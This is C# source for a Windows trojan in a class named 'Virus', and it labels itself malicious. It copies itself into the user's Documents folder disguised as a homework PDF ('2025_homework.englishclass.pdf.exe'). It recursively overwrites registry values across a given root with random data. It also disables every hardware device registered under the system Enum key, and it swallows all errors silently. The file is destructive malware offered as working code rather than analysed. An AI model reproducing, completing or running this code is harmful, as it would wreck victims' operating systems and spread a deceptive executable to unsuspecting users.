using Microsoft.Win32;
using System;

namespace Hiphenatus
{
    class Virus
    {
        // A virus is a submicroscopic infectious agent that replicates only
        // inside the living cells of an organism Viruses infect all life forms,
        // from animals and plants to microorganisms, including bacteria and archaea.

        // This class is designed to malicious virus-like behaviors of this trojan

        public void Procriar()
        {
            string currentPath = System.Reflection.Assembly.GetExecutingAssembly().Location;

            string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string clonePath = System.IO.Path.Combine(documentsPath, "2025_homework.englishclass.pdf.exe");
            System.IO.File.Copy(currentPath, clonePath, true);
        }

        public static void CorruptKey(RegistryKey key, string keyname)
        {
            Random random = new Random();
            string text = "";
            string text2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            object obj = key.GetValue(keyname, null, RegistryValueOptions.DoNotExpandEnvironmentNames);
            switch (key.GetValueKind(keyname))
            {
                case RegistryValueKind.String:
                case RegistryValueKind.ExpandString:
                    foreach (char c in (string)obj)
                    {
                        text += text2[random.Next(text2.Length + 1)].ToString();
                    }
                    obj = text;
                    break;
                case RegistryValueKind.Binary:
                    {
                        byte[] array = (byte[])obj;
                        for (int j = 0; j < array.Length; j++)
                        {
                            array[j] = (byte)random.Next(0, 256);
                        }
                        break;
                    }
                case RegistryValueKind.DWord:
                case RegistryValueKind.QWord:
                    obj = random.Next();
                    break;
                case RegistryValueKind.MultiString:
                    {
                        string[] array2 = (string[])obj;
                        for (int k = 0; k <= array2.Length; k++)
                        {
                            for (int l = 0; l < array2[k].Length; l++)
                            {
                                text += text2[random.Next(text2.Length + 1)].ToString();
                            }
                            array2[k] = text;
                        }
                        break;
                    }
            }
            key.SetValue(keyname, obj, key.GetValueKind(keyname));
            key.Close();
        }

        // Token: 0x0600000C RID: 12 RVA: 0x00002400 File Offset: 0x00000600
        public static void GetSubkeysAndCorrupt(RegistryKey root)
        {
            foreach (string subkey in root.GetSubKeyNames())
            {
                try
                {
                    Corrupt(root.CreateSubKey(subkey));
                }
                catch (Exception)
                {
                }
            }
        }

        // Token: 0x0600000D RID: 13 RVA: 0x00002448 File Offset: 0x00000648
        public static void Corrupt(RegistryKey root)
        {
            GetSubkeysAndCorrupt(root);
            foreach (string keyname in root.GetValueNames())
            {
                try
                {
                    CorruptKey(root, keyname);
                }
                catch (Exception)
                {}
            }
        }

        public static void HardDisable()
        {
            try
            {
                // Disable all connected hardware by disabling their registry entries
                using (RegistryKey systemKey = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Enum", true))
                {
                    if (systemKey != null)
                    {
                        foreach (string subkeyName in systemKey.GetSubKeyNames())
                        {
                            try
                            {
                                using (RegistryKey deviceKey = systemKey.OpenSubKey(subkeyName, true))
                                {
                                    if (deviceKey != null)
                                    {
                                        deviceKey.SetValue("ConfigFlags", 0x1, RegistryValueKind.DWord); // Mark as disabled
                                    }
                                }
                            }
                            catch (Exception)
                            {}
                        }
                    }
                }
            }
            catch (Exception)
            {}
        }
    }
}
